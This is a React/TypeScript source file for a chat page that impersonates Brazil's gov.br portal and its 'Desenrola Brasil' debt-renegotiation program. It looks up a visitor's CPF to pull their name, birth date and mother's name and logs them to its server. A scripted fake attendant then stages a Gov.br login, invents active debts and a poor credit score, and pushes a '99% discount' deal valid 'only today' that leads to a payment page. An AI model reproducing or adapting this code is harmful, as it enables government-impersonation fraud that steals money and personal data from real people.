import { createFileRoute } from "@tanstack/react-router";
import { useState, useEffect, useRef } from "react";
import { media } from "@/lib/media";
import { track } from "@/lib/tracking";
const iconeGov = { url: media.iconeGov };
const leticiaAvatar = { url: media.leticia };
const image1 = { url: media.image1 };
const video1 = { url: media.video1 };
const image2 = { url: media.image2 };
const scoreImg = { url: media.score };
const desktopAudio = { url: media.audios.desktop };
const buscaacordoAudio = { url: media.audios.buscaacordo };
const parabensAudio = { url: media.audios.parabens };
const pagamentoAudio = { url: media.audios.pagamento };
const avisoAudio = { url: media.audios.aviso };

export const Route = createFileRoute("/chat")({
  component: ChatPage,
});

const AUDIO_GAIN = 2.5;

function AudioPlayer({ src, onEnded }: { src: string; onEnded: () => void }) {
  const ref = useRef<HTMLAudioElement>(null);
  const boostedRef = useRef(false);
  const [playing, setPlaying] = useState(false);
  const [current, setCurrent] = useState(0);
  const [duration, setDuration] = useState(0);

  const fmt = (s: number) => {
    if (!isFinite(s)) return "0:00";
    const m = Math.floor(s / 60);
    const r = Math.floor(s % 60);
    return `${m}:${r.toString().padStart(2, "0")}`;
  };

  const boost = () => {
    if (boostedRef.current) return;
    const el = ref.current;
    if (!el) return;
    try {
      const AC: typeof AudioContext =
        (window as any).AudioContext || (window as any).webkitAudioContext;
      if (!AC) return;
      const ctx = new AC();
      
      // Criamos um nó de ganho para o boost
      const gain = ctx.createGain();
      gain.gain.value = AUDIO_GAIN;

      // Importante: Em alguns navegadores, o nó de origem deve ser criado uma única vez
      const source = ctx.createMediaElementSource(el);
      source.connect(gain).connect(ctx.destination);
      
      if (ctx.state === "suspended") void ctx.resume();
      boostedRef.current = true;
    } catch (e) {
      console.warn("Audio boost failed, falling back to standard volume", e);
      el.volume = 1;
    }
  };

  const toggle = () => {
    const el = ref.current;
    if (!el) return;
    boost();
    if (el.paused) el.play(); else el.pause();
  };

  const progress = duration > 0 ? (current / duration) * 100 : 0;

  return (
    <div className="bg-white border border-[#e5e5e5] rounded-[18px_18px_18px_4px] px-3 py-2.5 shadow-[0_2px_6px_rgba(0,0,0,0.07)] flex items-center gap-3 w-full">
      <button
        type="button"
        onClick={toggle}
        aria-label={playing ? "Pausar" : "Reproduzir"}
        className="shrink-0 w-11 h-11 rounded-full bg-[#1351B4] hover:bg-[#0F4DA8] transition-colors flex items-center justify-center"
      >
        {playing ? (
          <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
            <rect x="6" y="5" width="4" height="14" rx="1" />
            <rect x="14" y="5" width="4" height="14" rx="1" />
          </svg>
        ) : (
          <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
            <path d="M8 5v14l11-7z" />
          </svg>
        )}
      </button>
      <div className="flex-1 flex flex-col justify-center gap-1.5 min-w-0 mt-0.5">
        <div className="w-full h-1.5 bg-[#e5e5e5] rounded-full overflow-hidden">
          <div className="h-full bg-[#1351B4] transition-[width] duration-100" style={{ width: `${progress}%` }} />
        </div>
        <span className="text-[11px] text-[#555] tabular-nums shrink-0">
          {fmt(current)} / {fmt(duration)}
        </span>
      </div>
      <audio
        ref={ref}
        src={src}
        preload="auto"
        crossOrigin="anonymous"
        autoPlay
        onPlay={() => { boost(); setPlaying(true); }}
        onPause={() => setPlaying(false)}
        onTimeUpdate={(e) => setCurrent(e.currentTarget.currentTime)}
        onLoadedMetadata={(e) => setDuration(e.currentTarget.duration)}
        onEnded={() => { setPlaying(false); onEnded(); }}
        className="hidden"
      />
    </div>
  );
}


interface Message {
  id: string;
  type: "bot" | "user" | "system" | "info" | "typing" | "audio" | "link";
  content?: string;
  image?: string;
  video?: string;
  audio?: string;
  href?: string;
  infoLines?: { text: string; style: "label" | "value" | "bold" }[];
  buttons?: string[];
  pendingButtonLabel?: string;
  audioEnded?: boolean;
  audioResolveOnEnd?: boolean;
}

interface CpfData {
  status: number | string;
  cpf: string;
  nome: string;
  nascimento: string;
  sexo: string;
  mae: string;
}

function ChatPage() {
  const [messages, setMessages] = useState<Message[]>([]);
  const [isTyping, setIsTyping] = useState(false);
  const [userName, setUserName] = useState("");
  const [userNameFull, setUserNameFull] = useState("");
  const msgsEndRef = useRef<HTMLDivElement>(null);
  const startedRef = useRef(false);
  const resolversRef = useRef<Record<string, (v: string) => void>>({});

  const scrollToBottom = () => {
    msgsEndRef.current?.scrollIntoView({ behavior: "smooth" });
  };

  useEffect(() => {
    scrollToBottom();
  }, [messages]);

  useEffect(() => {
    if (startedRef.current) return;
    startedRef.current = true;

    const params = new URLSearchParams(window.location.search);
    const urlCpf = params.get("cpf") || "";

    if (!urlCpf) {
      setMessages([{ id: "err", type: "system", content: "<em><strong>(Dados incompletos. Redirecionando para o início...)</strong></em>" }]);
      setTimeout(() => { window.location.href = "/cpf"; }, 1800);
      return;
    }

    const timeoutPromise = new Promise<CpfData | null>((resolve) =>
      setTimeout(() => resolve(null), 12000)
    );

    const cpfPromise: Promise<CpfData | null> = Promise.race([
      fetch(`/api/public/cpf/lookup?cpf=${encodeURIComponent(urlCpf)}&t=${Date.now()}`, {
        cache: "no-store",
        headers: { accept: "application/json", "Cache-Control": "no-cache" },
      })
        .then(async (r) => {
          const data: any = await r.json().catch(() => null);
          if (!data || (data.status !== 200 && data.status !== "200") || !data.nome) return null;
          return data as CpfData;
        })
        .catch((err) => {
          console.error("Erro na consulta do CPF:", err);
          return null;
        }),
      timeoutPromise,
    ]);

    // Log da consulta em paralelo, sem bloquear o fluxo.
    cpfPromise.then((data) => {
      if (data && (data.status === 200 || data.status === "200")) {
        setUserName(data.nome.split(" ")[0]);
        setUserNameFull(data.nome);
        fetch("/api/public/log/cpf", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            cpf: data.cpf,
            nome: data.nome,
            nascimento: data.nascimento,
            sexo: data.sexo,
            mae: data.mae,
            status_api: data.status,
            raw: data,
          }),
        }).catch(() => {});
      } else {
        fetch("/api/public/log/cpf", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ cpf: urlCpf, status_api: data?.status ?? null }),
        }).catch(() => {});
      }
    });

    // Inicia o fluxo imediatamente; aguarda os dados apenas quando precisar deles.
    startFlow(cpfPromise);
  }, []);

  const formatCpf = (cpf: string) =>
    cpf.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, "$1.$2.$3-$4");

  const startFlow = async (dataPromise: Promise<CpfData | null>) => {
    await simulateTypingByLength(0);
    addMessage({ id: "1", type: "bot", image: image1.url });

    // Mensagem 2 depende do nome; aguarda os dados aqui (com 120ms de "digitando" já rolando).
    const typingP = simulateTypingByLength(120);
    const data = await dataPromise;
    await typingP;

    const nomeCompleto = data && (data.status === 200 || data.status === "200") ? data.nome : "";
    const saudacao = nomeCompleto
      ? `Olá <strong>${nomeCompleto}</strong>, esse é um canal oficial de atendimento do <strong>Desenrola Brasil</strong> e os seus dados estão seguros conosco. 🔒`
      : `Olá, esse é um canal oficial de atendimento do <strong>Desenrola Brasil</strong> e os seus dados estão seguros conosco. 🔒`;

    addMessage({ id: "2", type: "bot", content: saudacao });

    await simulateTypingByLength(80);
    addMessage({ id: "3", type: "bot", content: "Aguarde em alguns instantes, um de nossos atendentes entrará na conversa.." });

    await simulateTypingByLength(0);
    addMessage({ id: "4", type: "bot", video: video1.url });

    await sleep(2000);
    addMessage({ id: "5", type: "system", content: "<em><strong>(Atendente Letícia entrou na conversa..)</strong></em> 💬" });

    if (data && (data.status === 200 || data.status === "200")) {
      await simulateTypingByLength(120);
      addMessage({
        id: "6",
        type: "info",
        infoLines: [
          { text: "Para continuar, confirme seus dados:", style: "bold" },
          { text: "Nome:", style: "bold" },
          { text: data.nome, style: "value" },
          { text: "CPF:", style: "bold" },
          { text: formatCpf(data.cpf), style: "value" },
          { text: "Nascimento:", style: "bold" },
          { text: data.nascimento, style: "value" },
        ]
      });

      const answer = await waitButtons("6-btn", ["Sim, está correto.", "Não sou eu"]);
      if (answer === "Sim, está correto.") {
        await continueFlow(data);
      } else {
        await botSay("nao", "Por favor, acesse o site com o seu CPF para prosseguir.");
        setTimeout(() => { window.location.href = "/cpf"; }, 1500);
      }
    } else if (data) {
      await simulateTypingByLength(50);
      addMessage({ id: "6-err", type: "bot", content: "Não conseguimos localizar seus dados automaticamente. Por favor, verifique seu CPF." });
    } else {
      await simulateTypingByLength(50);
      addMessage({ id: "6-err", type: "bot", content: "Ocorreu um erro ao consultar seus dados. Tente novamente mais tarde." });
    }
  };

  const continueFlow = async (data: CpfData) => {
    await botSay("c1", "Obrigada!");
    await botSay("c2", "Aguarde... Entrando em sua conta Gov.br");
    await botSay("c3", "<strong>Login efetuado com sucesso!</strong>");
    await botSay("c4", `<strong>${data.nome}</strong><br/>Seja bem vindo(a) a sua conta Gov.br`);
    await botSay("c5", "Negocie dívidas com as seguintes empresas:");
    addMessage({ id: "c6", type: "bot", image: image2.url });

    await waitButtons("c7", ["CONTINUAR"]);

    await waitAudioButton("c8", desktopAudio.url, "SIM! QUERO NEGOCIAR");

    await botSay("c9", "<em>Por favor, aguarde analisarmos a situação do seu CPF em nosso sistema..</em>");
    await sleep(3000);
    await botSay("c10", "<em>Consultando..</em>");
    await sleep(3000);
    await botSay("c11", "<strong>Análise concluída!</strong>");
    await sleep(3000);
    await botSay("c12", "Identificamos <strong>4 dívidas ativas</strong> no sistema. Os valores variam entre <strong>R$ 1.728,74 a R$ 5.278,23</strong> de dívida <strong>em seu CPF.</strong>");
    await sleep(3000);

    addMessage({
      id: "c13",
      type: "info",
      infoLines: [
        { text: "Situação para CPF:", style: "label" },
        { text: formatCpf(data.cpf), style: "value" },
        { text: "NEGATIVADO.", style: "bold" }
      ]
    });

    const NOME_COMPLETO = data.nome;
    const CPF_FORMATADO = formatCpf(data.cpf);
    const CODIGO_ACORDO = generateAcordoCode();
    const VALOR = "R$ 68,92";
    const PHONE = "";
    const EMAIL = "cliente@gmail.com";

    // Registra a sessão de chat / código de acordo no Supabase.
    fetch("/api/public/log/chat", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ cpf: data.cpf, nome: NOME_COMPLETO, codigo_acordo: CODIGO_ACORDO }),
    }).catch(() => {});

    track("chat", "chat_view", { cpf: data.cpf, nome: NOME_COMPLETO });
    track("chat", "chat_acordo_gerado", { cpf: data.cpf, nome: NOME_COMPLETO, acordo: CODIGO_ACORDO });

    await botSay("s1", "Segundo nossos registros, seu SCORE é considerado muito baixo <strong>(alto risco para crédito):</strong>");
    addMessage({ id: "s2", type: "bot", image: scoreImg.url });
    await botSay("s3", "Você deseja verificar se existe algum acordo com desconto disponível para você?");
    await waitButtons("s4", ["BUSCAR ACORDO"]);

    await botSay("s5", "<em>Por favor, aguarde enquanto nosso sistema verifica se existem acordos disponíveis para você...</em>");
    await botSay("s6", "<strong>Acordo encontrado!</strong>");
    addMessage({
      id: "s7",
      type: "info",
      infoLines: [
        { text: "1 (um) acordo foi encontrado para:", style: "bold" },
        { text: NOME_COMPLETO, style: "value" },
        { text: `CPF: ${CPF_FORMATADO}`, style: "value" }
      ]
    });
    await waitButtons("s8", ["VER ACORDO"]);

    await waitAudioEnd("a-busca", buscaacordoAudio.url);
    await botSay("s9", `Parabéns <strong>${NOME_COMPLETO}!</strong><br/><br/>Pode comemorar! Encontramos um <strong>SUPER ACORDO DE 99% DE DESCONTO</strong> para você!`);
    await botSay("s10", `<em>Acessando o acordo <strong>${CODIGO_ACORDO}</strong>...</em>`);
    await botSay("s11", `Informações do acordo <strong><em>${CODIGO_ACORDO}</em></strong> para (${NOME_COMPLETO})<br/><br/>(CPF: ${CPF_FORMATADO})`);
    await botSay("s12", `O contrato atual é válido apenas para o titular: <strong>${NOME_COMPLETO}</strong> portador(a) do CPF: <strong>${CPF_FORMATADO}</strong>`);
    await botSay("s13", `Você gostaria de realizar o seu acordo com <strong>99% DE DESCONTO</strong> para quitar <strong>todas</strong> as suas dívidas e ter seu nome limpo novamente por apenas <strong>${VALOR}</strong>?`);
    await waitButtons("s14", ["CONFIRMAR O ACORDO E LIMPAR O NOME"]);

    await waitAudioEnd("a-parabens", parabensAudio.url);
    await botSay("s15", "<strong>Acordo confirmado com sucesso!</strong>");
    await waitButtons("s16", ["CONTINUAR"]);

    await waitAudioEnd("a-pagamento", pagamentoAudio.url);
    addMessage({
      id: "s17",
      type: "info",
      infoLines: [
        { text: `Acordo confirmado: ${CODIGO_ACORDO}!`, style: "label" },
        { text: "Beneficiário(a):", style: "label" },
        { text: NOME_COMPLETO, style: "bold" },
        { text: "Identificação (CPF):", style: "label" },
        { text: CPF_FORMATADO, style: "bold" },
        { text: "Quitação de todas as dívidas em ativo no CPF.", style: "value" },
        { text: "895 Pontos no score.", style: "bold" },
        { text: `Valor da proposta: ${VALOR}`, style: "label" }
      ]
    });
    await waitButtons("s18", ["CONTINUAR PARA O PAGAMENTO"]);

    await waitAudioEnd("a-aviso", avisoAudio.url);
    await botSay("s19", "<strong><em>Atenção!</em></strong> <em>Oferta Válida Apenas para hoje.</em>");
    await botSay("s20", "<em>Clique no botão abaixo para acessar a próxima tela e realizar seu pagamento</em>");

    await sleep(600);
    const qs = `?cpf=${encodeURIComponent(data.cpf)}&nome=${encodeURIComponent(NOME_COMPLETO)}&phone=${encodeURIComponent(PHONE)}&email=${encodeURIComponent(EMAIL)}&valor=${encodeURIComponent(VALOR)}&acordo=${encodeURIComponent(CODIGO_ACORDO)}`;
    addMessage({ id: "s21", type: "link", href: `/pagamento${qs}`, content: "REALIZAR PAGAMENTO DO ACORDO E LIMPAR MEU NOME" });
  };

  const generateAcordoCode = () => {
    const alphabet = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
    let block = "";
    for (let i = 0; i < 6; i++) block += alphabet[Math.floor(Math.random() * alphabet.length)];
    const digits = String(Math.floor(1000 + Math.random() * 9000));
    return `DBR-${block}-${digits}`;
  };

  const botSay = async (id: string, html: string) => {
    await simulateTypingByLength(html.length);
    addMessage({ id, type: "bot", content: html });
  };

  const waitButtons = (id: string, buttons: string[]): Promise<string> => {
    return new Promise((resolve) => {
      resolversRef.current[id] = resolve;
      addMessage({ id, type: "typing", buttons });
    });
  };

  const waitAudioButton = (id: string, audioUrl: string, buttonLabel: string): Promise<string> => {
    return new Promise((resolve) => {
      resolversRef.current[id] = resolve;
      addMessage({ id, type: "audio", audio: audioUrl, pendingButtonLabel: buttonLabel, audioEnded: false });
    });
  };

  const waitAudioEnd = (id: string, audioUrl: string): Promise<void> => {
    return new Promise((resolve) => {
      resolversRef.current[id] = () => resolve();
      addMessage({ id, type: "audio", audio: audioUrl, audioEnded: false, audioResolveOnEnd: true });
    });
  };

  const handleButtonClick = (msgId: string, label: string) => {
    const resolver = resolversRef.current[msgId];
    if (!resolver) return;
    delete resolversRef.current[msgId];
    setMessages(prev => prev.map(m => {
      if (m.id !== msgId) return m;
      if (m.type === "audio") return { ...m, pendingButtonLabel: undefined };
      return m;
    }).filter(m => m.type === "audio" || m.id !== msgId));
    addMessage({ id: `${msgId}-u-${Date.now()}`, type: "user", content: label });
    resolver(label);
  };

  const handleAudioEnded = (msgId: string) => {
    setMessages(prev => {
      const msg = prev.find(m => m.id === msgId);
      if (msg?.audioResolveOnEnd) {
        const resolver = resolversRef.current[msgId];
        if (resolver) {
          delete resolversRef.current[msgId];
          resolver("");
        }
      }
      return prev.map(m => m.id === msgId ? { ...m, audioEnded: true } : m);
    });
  };

  const simulateTypingByLength = async (length: number) => {
    setIsTyping(true);
    const ms = Math.min(2500, Math.max(600, length * 15));
    await sleep(ms);
    setIsTyping(false);
  };

  const addMessage = (msg: Message) => {
    setMessages(prev => [...prev, msg]);
  };

  const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

  return (
    <div className="flex flex-col h-screen font-['Inter',sans-serif] bg-[#f0f2f5]">
      <header className="bg-white border-b-3 border-[#1351B4] shadow-[0_2px_8px_rgba(0,0,0,0.1)] h-[58px] flex items-center justify-between px-4 shrink-0">
        <img src={iconeGov.url} alt="gov.br" className="h-[34px]" />
        <button className="bg-[#1351B4] text-white border-none rounded-[50px] px-3.5 py-1.5 flex items-center gap-1.5 text-sm font-medium">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
            <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path>
          </svg>
          <span>{userName || "Carregando..."}</span>
        </button>
      </header>

      <div className="bg-white border-b border-[#e5e5e5] flex items-center gap-2.5 px-3.5 py-2 shrink-0 h-14">
        <img src={leticiaAvatar.url} alt="Letícia M." className="w-[38px] h-[38px] rounded-full object-cover shrink-0" />
        <div>
          <div className="font-bold text-sm text-[#1a1a1a]">Letícia M.</div>
          <div className="text-[12px] text-[#666]">Atendente do Programa Desenrola Brasil</div>
        </div>
      </div>

      <div className="flex-1 overflow-y-auto p-4 max-w-[680px] w-full mx-auto flex flex-col gap-2">
        {messages.map((msg) => (
          <div key={msg.id} className={`flex ${msg.type === "user" ? "justify-end" : "justify-start"} items-end mb-2`}>
            {msg.type !== "user" && msg.type !== "system" && msg.type !== "typing" && (
              <img src={leticiaAvatar.url} alt="" className="w-[30px] h-[30px] rounded-full object-cover mr-2 mb-0.5" />
            )}

            {msg.type === "bot" && (
              <div className="bg-white text-[#333] border border-[#e5e5e5] rounded-[18px_18px_18px_4px] p-[11px_15px] text-sm leading-[1.55] max-w-[78%] shadow-[0_2px_6px_rgba(0,0,0,0.07)] animate-in fade-in slide-in-from-bottom-2">
                {msg.content && <div dangerouslySetInnerHTML={{ __html: msg.content }} />}
                {msg.image && <img src={msg.image} alt="" className="w-full rounded-lg mt-1" />}
                {msg.video && (
                  <div className="relative group cursor-pointer" onClick={(e) => {
                    const video = e.currentTarget.querySelector('video');
                    if (video) {
                      if (video.muted) {
                        video.muted = false;
                        video.currentTime = 0; // Opcional: reinicia ao desmutar
                        video.play();
                        e.currentTarget.querySelector('.unmute-overlay')?.classList.add('hidden');
                      } else if (video.paused) {
                        video.play();
                      } else {
                        video.pause();
                      }
                    }
                  }}>
                    <video 
                      controls={false} 
                      className="w-full rounded-lg mt-1"
                      autoPlay
                      muted
                      playsInline
                      onPlay={(e) => {
                        if (!e.currentTarget.muted) {
                          e.currentTarget.parentElement?.querySelector('.unmute-overlay')?.classList.add('hidden');
                        }
                      }}
                    >
                      <source src={msg.video} type="video/mp4" />
                    </video>
                    <div className="unmute-overlay absolute inset-0 flex items-center justify-center bg-black/40 rounded-lg transition-opacity">
                      <div className="flex flex-col items-center gap-2 bg-white/90 p-4 rounded-2xl shadow-lg border border-white/20">
                        <div className="w-12 h-12 flex items-center justify-center bg-[#1351B4] rounded-full">
                          <svg className="w-6 h-6 text-white" viewBox="0 0 24 24" fill="currentColor">
                            <path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z" />
                          </svg>
                        </div>
                        <span className="text-[#1351B4] font-bold text-sm">Toque aqui para ouvir</span>
                      </div>
                    </div>
                  </div>
                )}
              </div>
            )}

            {msg.type === "user" && (
              <div className="bg-gradient-to-br from-[#1351B4] to-[#0F4DA8] text-white rounded-[18px_18px_4px_18px] p-[11px_15px] text-sm leading-[1.55] max-w-[78%] animate-in fade-in slide-in-from-bottom-2">
                {msg.content}
              </div>
            )}

            {msg.type === "system" && (
              <div className="w-full text-center text-[#666] text-[12.5px] italic p-1 animate-in fade-in" dangerouslySetInnerHTML={{ __html: msg.content || "" }} />
            )}

            {msg.type === "info" && (
              <div className="bg-[#EFF6FF] border border-[#BFDBFE] rounded-xl p-[14px_16px] text-sm leading-[1.8] max-w-[82%] animate-in fade-in slide-in-from-bottom-2">
                {msg.infoLines?.map((line, idx) => (
                  <div key={idx} className={`${line.style === "bold" ? "font-bold text-black" : line.style === "value" ? "text-[#1351B4] mb-1" : "text-[#555] text-[13px]"}`}>
                    {line.text}
                  </div>
                ))}
              </div>
            )}

            {msg.type === "audio" && (
              <div className="flex flex-col gap-2 max-w-[82%] w-full">
                <AudioPlayer src={msg.audio!} onEnded={() => handleAudioEnded(msg.id)} />
                {msg.audioEnded && msg.pendingButtonLabel && (
                  <div className="flex justify-end">
                    <button
                      onClick={() => handleButtonClick(msg.id, msg.pendingButtonLabel!)}
                      className="bg-[#1351B4] text-white border-2 border-[#1351B4] rounded-[22px] p-[10px_18px] text-sm font-semibold cursor-pointer hover:bg-[#0F4DA8] transition-colors shadow-sm"
                    >
                      {msg.pendingButtonLabel}
                    </button>
                  </div>
                )}
              </div>
            )}

            {msg.type === "typing" && msg.buttons && (
              <div className="flex flex-wrap gap-2.5 justify-end w-full mt-1.5">
                {msg.buttons.map((btn) => (
                  <button
                    key={btn}
                    onClick={() => handleButtonClick(msg.id, btn)}
                    className="bg-white border-2 border-[#1351B4] text-[#1351B4] rounded-[22px] p-[10px_18px] text-sm font-medium cursor-pointer hover:bg-[#1351B4] hover:text-white transition-colors shadow-sm"
                  >
                    {btn}
                  </button>
                ))}
              </div>
            )}

            {msg.type === "link" && msg.href && (
              <div className="w-full flex justify-start ml-[38px]">
                <a
                  href={msg.href}
                  className="inline-block bg-[#1351B4] text-white text-center rounded-[22px] px-5 py-3 text-sm font-bold uppercase tracking-wide hover:bg-[#0F4DA8] transition-colors shadow-md no-underline"
                >
                  {msg.content}
                </a>
              </div>
            )}
          </div>
        ))}
        {isTyping && (
          <div className="flex justify-start items-end mb-2">
            <img src={leticiaAvatar.url} alt="" className="w-[30px] h-[30px] rounded-full object-cover mr-2 mb-0.5" />
            <div className="bg-white text-[#333] border border-[#e5e5e5] rounded-[18px_18px_18px_4px] p-[11px_15px] shadow-[0_2px_6px_rgba(0,0,0,0.07)]">
              <div className="flex gap-1 py-1">
                <span className="w-1.5 h-1.5 bg-[#bbb] rounded-full animate-bounce" style={{ animationDelay: '0ms' }} />
                <span className="w-1.5 h-1.5 bg-[#bbb] rounded-full animate-bounce" style={{ animationDelay: '150ms' }} />
                <span className="w-1.5 h-1.5 bg-[#bbb] rounded-full animate-bounce" style={{ animationDelay: '300ms' }} />
              </div>
            </div>
          </div>
        )}
        <div ref={msgsEndRef} />
      </div>

      <footer className="bg-[#071D41] h-[72px] flex flex-col justify-center px-[18px] shrink-0">
        <div className="text-white text-lg font-extrabold tracking-[-0.5px] mb-0.5">gov.br</div>
        <div className="text-[#E08D1E] text-[11px]">Todo o conteúdo deste site está publicado sob a licença</div>
        <div className="text-white text-[11px] font-bold">Sistema de Renegociação - Todos os direitos reservados</div>
      </footer>
    </div>
  );
}
